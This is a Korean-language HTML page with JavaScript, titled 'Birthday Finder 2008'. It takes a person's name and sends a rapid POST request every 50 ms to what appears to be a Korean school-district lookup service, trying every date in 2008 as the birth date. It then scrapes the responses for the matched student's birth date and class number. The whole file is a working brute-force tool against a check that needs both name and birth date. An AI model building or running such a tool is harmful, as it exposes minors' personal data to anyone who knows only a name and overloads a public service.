<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Birthday Finder</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 600px;
            width: 100%;
        }
        
        h1 {
            color: #333;
            margin-bottom: 30px;
            text-align: center;
            font-size: 28px;
        }
        
        .input-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            background: #f5f5f5;
            color: #666;
            text-align: center;
            font-size: 14px;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .results {
            margin-top: 25px;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .result-item {
            background: #f8f9fa;
            border-left: 4px solid #667eea;
            padding: 15px;
            margin-bottom: 12px;
            border-radius: 8px;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .result-item strong {
            color: #667eea;
            font-size: 16px;
        }
        
        .result-item div {
            margin-top: 5px;
            color: #555;
            font-size: 14px;
        }
        
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid rgba(102, 126, 234, 0.3);
            border-radius: 50%;
            border-top-color: #667eea;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎂 Birthday Finder 2008</h1>
        
        <div class="input-group">
            <label for="nameInput">이름을 입력하세요:</label>
            <input type="text" id="nameInput" placeholder="예: 홍길동" autocomplete="off">
        </div>
        
        <button id="searchBtn" onclick="startSearch()">검색 시작</button>
        
        <div class="status" id="status">이름을 입력하고 검색 버튼을 클릭하세요</div>
        
        <div class="results" id="results"></div>
    </div>

    <script>
        let isSearching = false;
        let currentIndex = 0;
        let dates2008 = [];
        let intervalId = null;
        let userName = '';

        // Generate all dates in 2008 including leap year (02/29)
        function generateDates2008() {
            const dates = [];
            const daysInMonth = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]; // 2008 is leap year
            
            for (let month = 1; month <= 12; month++) {
                for (let day = 1; day <= daysInMonth[month - 1]; day++) {
                    const monthStr = String(month).padStart(2, '0');
                    const dayStr = String(day).padStart(2, '0');
                    dates.push(`2008${monthStr}${dayStr}`);
                }
            }
            
            return dates;
        }

        async function sendRequest(name, birthday) {
            const url = 'https://gcja-h.goeay.kr/gcja-h/presnatn/selectPresnatnSrchList.do';
            
            const params = new URLSearchParams({
                mi: '12491',
                presnatnSn: '311',
                inqireCndNm01: '이름',
                inqireCndNm02: '생년월일8자리 (예) 20090101)',
                inqireCndSrch01: name,
                inqireCndSrch02: birthday,
                sysId: 'gcja-h'
            });

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: params.toString()
                });

                const text = await response.text();
                return { birthday, text };
            } catch (error) {
                console.error(`Error for ${birthday}:`, error);
                return { birthday, text: null, error: true };
            }
        }

        function extractClass(html) {
            // Find all <td> elements with single digit 1-8
            const regex = /<td>([1-8])<\/td>/gi;
            const matches = [...html.matchAll(regex)];
            
            if (matches.length >= 3) {
                // Return the third match without tags
                return matches[2][1];
            }
            
            return null;
        }

        function formatDate(yyyymmdd) {
            const year = yyyymmdd.substring(0, 4);
            const month = yyyymmdd.substring(4, 6);
            const day = yyyymmdd.substring(6, 8);
            return `${year}년 ${month}월 ${day}일`;
        }

        function updateStatus(message, isLoading = false) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = isLoading 
                ? `<span class="spinner"></span>${message}` 
                : message;
        }

        function addResult(birthday, className) {
            const resultsEl = document.getElementById('results');
            const resultItem = document.createElement('div');
            resultItem.className = 'result-item';
            resultItem.innerHTML = `
                <strong>✅ 발견!</strong>
                <div>생년월일: ${formatDate(birthday)}</div>
                <div>학급: ${className}반</div>
            `;
            resultsEl.appendChild(resultItem);
        }

        function processNextRequest() {
            if (currentIndex >= dates2008.length) {
                // All dates checked
                clearInterval(intervalId);
                isSearching = false;
                document.getElementById('searchBtn').disabled = false;
                updateStatus('✅ 검색 완료!');
                return;
            }

            const birthday = dates2008[currentIndex];
            updateStatus(`🔍 검색 중... (${currentIndex + 1}/${dates2008.length}) - ${formatDate(birthday)}`, true);

            // Send request asynchronously without await
            sendRequest(userName, birthday).then(result => {
                if (result.error) {
                    // Skip on error
                    return;
                }

                if (result.text && !result.text.includes('없습니다')) {
                    // Found a match
                    const className = extractClass(result.text);
                    if (className) {
                        addResult(result.birthday, className);
                    } else {
                        // Found but couldn't extract class
                        addResult(result.birthday, '알 수 없음');
                    }
                }
            });

            currentIndex++;
        }

        function startSearch() {
            const nameInput = document.getElementById('nameInput');
            userName = nameInput.value.trim();

            if (!userName) {
                alert('이름을 입력해주세요!');
                return;
            }

            if (isSearching) {
                return;
            }

            // Initialize
            isSearching = true;
            currentIndex = 0;
            dates2008 = generateDates2008();
            document.getElementById('results').innerHTML = '';
            document.getElementById('searchBtn').disabled = true;

            updateStatus('🚀 검색 시작...', true);

            // Start interval to send requests every 50ms
            intervalId = setInterval(processNextRequest, 50);
        }

        // Allow Enter key to start search
        document.getElementById('nameInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                startSearch();
            }
        });
    </script>
</body>
</html>
